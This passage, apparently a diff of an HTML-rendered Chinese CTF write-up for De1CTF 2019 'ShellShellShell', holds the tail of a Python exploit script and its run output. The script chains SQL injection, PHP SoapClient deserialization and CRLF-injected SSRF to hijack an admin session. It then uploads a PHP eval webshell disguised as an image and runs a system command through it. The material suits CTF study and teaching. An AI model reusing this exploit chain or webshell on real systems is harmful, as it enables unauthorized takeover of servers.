+    <span class="k">return</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;publish&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;signature&#39;</span><span class="p">:</span><span class="n">sig</span><span class="p">,</span><span class="s1">&#39;mood&#39;</span><span class="p">:</span><span class="n">mood</span><span class="p">})</span><span class="c1">#, proxies={&#39;http&#39;:&#39;127.0.0.1:8080&#39;})</span>
+
+<span class="k">def</span> <span class="nf">get_prc_now</span><span class="p">():</span>
+    <span class="c1"># date_default_timezone_set(&quot;PRC&quot;) is not important</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;-r&#39;</span><span class="p">,</span> <span class="s1">&#39;date_default_timezone_set(&quot;PRC&quot;); echo time();&#39;</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">get_admin_session</span><span class="p">():</span>
+    <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;login&#39;</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">solve_code</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">sess</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">],</span> <span class="n">code</span>
+
+<span class="n">get_code_dict</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] creating user session to trigger ssrf&#39;</span><span class="p">)</span>
+<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="n">get_creds</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] register({}, {})&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+<span class="n">register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] login({}, {})&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+<span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] user session =&gt; &#39;</span> <span class="o">+</span> <span class="n">sess</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">])</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] getting fresh session to be authenticated as admin&#39;</span><span class="p">)</span>
+<span class="n">phpsessid</span><span class="p">,</span> <span class="n">code</span> <span class="o">=</span> <span class="n">get_admin_session</span><span class="p">()</span>
+
+<span class="n">ssrf</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1/</span><span class="se">\x0d\x0a</span><span class="s1">Content-Length:0</span><span class="se">\x0d\x0a\x0d\x0a\x0d\x0a</span><span class="s1">POST /index.php?action=login HTTP/1.1</span><span class="se">\x0d\x0a</span><span class="s1">Host: 127.0.0.1</span><span class="se">\x0d\x0a</span><span class="s1">Cookie: PHPSESSID={}</span><span class="se">\x0d\x0a</span><span class="s1">Content-Type: application/x-www-form-urlencoded</span><span class="se">\x0d\x0a</span><span class="s1">Content-Length: 200</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s1">username=admin&amp;password=jaivypassword&amp;code={}&amp;</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s1">POST /foo</span><span class="se">\x0d\x0a</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">phpsessid</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+<span class="n">mood</span> <span class="o">=</span> <span class="s1">&#39;O:10:</span><span class="se">\&quot;</span><span class="s1">SoapClient</span><span class="se">\&quot;</span><span class="s1">:4:{{s:3:</span><span class="se">\&quot;</span><span class="s1">uri</span><span class="se">\&quot;</span><span class="s1">;s:{}:</span><span class="se">\&quot;</span><span class="s1">{}</span><span class="se">\&quot;</span><span class="s1">;s:8:</span><span class="se">\&quot;</span><span class="s1">location</span><span class="se">\&quot;</span><span class="s1">;s:39:</span><span class="se">\&quot;</span><span class="s1">http://127.0.0.1/index.php?action=login</span><span class="se">\&quot;</span><span class="s1">;s:15:</span><span class="se">\&quot;</span><span class="s1">_stream_context</span><span class="se">\&quot;</span><span class="s1">;i:0;s:13:</span><span class="se">\&quot;</span><span class="s1">_soap_version</span><span class="se">\&quot;</span><span class="s1">;i:1;}}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ssrf</span><span class="p">),</span> <span class="n">ssrf</span><span class="p">)</span>
+<span class="n">mood</span> <span class="o">=</span> <span class="s1">&#39;0x&#39;</span><span class="o">+</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">k</span><span class="p">:</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">k</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">),</span> <span class="n">mood</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a`, {}); -- -&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">mood</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] final sqli/ssrf payload: &#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] injecting payload through sqli&#39;</span><span class="p">)</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">publish</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] triggering object deserialization -&gt; ssrf&#39;</span><span class="p">)</span>
+<span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;index&#39;</span><span class="p">)</span><span class="c1">#, proxies={&#39;http&#39;:&#39;127.0.0.1:8080&#39;})</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] admin session =&gt; &#39;</span> <span class="o">+</span> <span class="n">phpsessid</span><span class="p">)</span>
+
+<span class="c1"># switching to admin session</span>
+<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">sess</span><span class="o">.</span><span class="n">cookies</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">cookiejar_from_dict</span><span class="p">({</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">phpsessid</span><span class="p">})</span>
+
+<span class="c1"># resp = sess.post(_action+&#39;publish&#39;)</span>
+<span class="c1"># print resp.text</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] uploading stager&#39;</span><span class="p">)</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;pic&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;jaivy.php&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;?php @eval($_POST[jaivy]);?&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;publish&#39;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">shell</span><span class="p">)</span>
+<span class="c1"># print resp.text</span>
+<span class="n">webshell_url</span><span class="o">=</span><span class="n">_target</span><span class="o">+</span><span class="s1">&#39;upload/jaivy.php&#39;</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] shell =&gt; &#39;</span><span class="o">+</span><span class="n">webshell_url</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">post_data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;jaivy&quot;</span><span class="p">:</span><span class="s2">&quot;system(&#39;ls -al&#39;);&quot;</span><span class="p">}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">webshell_url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</pre></div>
+</td></tr></table>
+
+</details>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ python3 ssrf_crlf_getshell_exp.py
+<span class="o">[</span>+<span class="o">]</span> Genering <span class="m">778688</span> captchas...
+<span class="o">[</span>+<span class="o">]</span> creating user session to trigger ssrf
+<span class="o">[</span>+<span class="o">]</span> register<span class="o">(</span>vxh1ibbu07, gt6t82o2uo<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> login<span class="o">(</span>vxh1ibbu07, gt6t82o2uo<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> user <span class="nv">session</span> <span class="o">=</span>&gt; nr9qnj7i73e93q5hf8oe0tcnn6
+<span class="o">[</span>+<span class="o">]</span> getting fresh session to be authenticated as admin
+<span class="o">[</span>+<span class="o">]</span> final sqli/ssrf payload: a<span class="sb">`</span>, 0x4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a3238303a22687474703a2f2f3132372e302e302e312f0d0a436f6e74656e742d4c656e6774683a300d0a0d0a0d0a504f5354202f696e6465782e7068703f616374696f6e3d6c6f67696e20485454502f312e310d0a486f73743a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d306d62726d6c36613273656b316e747334646b666335727035330d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a203230300d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d622757463327260d0a0d0a504f5354202f666f6f0d0a223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31333a225f736f61705f76657273696f6e223b693a313b7d<span class="o">)</span><span class="p">;</span> -- -
+<span class="o">[</span>+<span class="o">]</span> injecting payload through sqli
+<span class="o">[</span>+<span class="o">]</span> triggering object deserialization -&gt; ssrf
+<span class="o">[</span>+<span class="o">]</span> admin <span class="nv">session</span> <span class="o">=</span>&gt; 0mbrml6a2sek1nts4dkfc5rp53
+<span class="o">[</span>+<span class="o">]</span> uploading stager
+<span class="o">[</span>+<span class="o">]</span> <span class="nv">shell</span> <span class="o">=</span>&gt; http://127.0.0.1:11027/upload/jaivy.php
+
+&lt;!DOCTYPE HTML PUBLIC <span class="s2">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL /upload/jaivy.php was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at <span class="m">127</span>.0.0.1 Port <span class="m">11027</span>&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</pre></div>
+</td></tr></table>
+
+<details class="quote" open="open"><summary>参考链接</summary><ul>
+<li><a href="https://xz.aliyun.com/t/2148">N1CTF Easy&amp;&amp;Hard Php Writeup</a></li>
+<li><a href="https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/ShellShellShell/README_zh.md">https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/ShellShellShell/README_zh.md</a></li>
+<li><a href="https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/ShellShellShell/dockerfile">https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/ShellShellShell/dockerfile</a></li>
+<li><a href="https://www.xctf.org.cn/library/details/79378efa88bff52451b2f822abe562d29ae7aade/">https://www.xctf.org.cn/library/details/79378efa88bff52451b2f822abe562d29ae7aade/</a></li>
+<li><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1565858991&amp;ver=1791&amp;signature=hIX-hA2DxsOWzLHCIU*ONH0q*E4MWL0i*qmhQnBIqlmpZh6KD9ehk8XcyEuhmnnYbNa2g8jNrYwm44C5zZchM*Nb*lV1buaXryI1huMoEZuY88CG8usGQF55mPb6TDGl&amp;new=1">Docker教程：Docker Compose入门</a></li>
+</ul>
+</details>
                 
                   
                 
